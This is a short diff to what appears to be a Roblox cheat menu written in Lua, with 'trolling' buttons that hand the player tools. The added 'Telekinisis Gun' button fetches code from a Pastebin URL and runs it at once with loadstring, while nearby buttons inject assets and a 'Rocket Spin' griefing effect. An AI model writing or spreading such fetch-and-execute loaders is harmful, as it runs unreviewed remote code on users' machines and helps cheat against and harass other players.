@@ -292,6 +292,9 @@ end)
 TrollingSection:NewButton("AK-47", "Click to get tool", function()
     game:GetObjects("rbxassetid://149948769")[1].Parent=game.Players.LocalPlayer.Backpack
 end)
+TrollingSection:NewButton("Telekinisis Gun", "Click to get tool", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/fauftxLe", true))()
+end)
 local TrollingSection = Trolling:NewSection("Broken Stuff")
 TrollingSection:NewButton("Rocket Spin", "Click to get tool", function()
 power = 20000 -- change this to make it more or less powerful
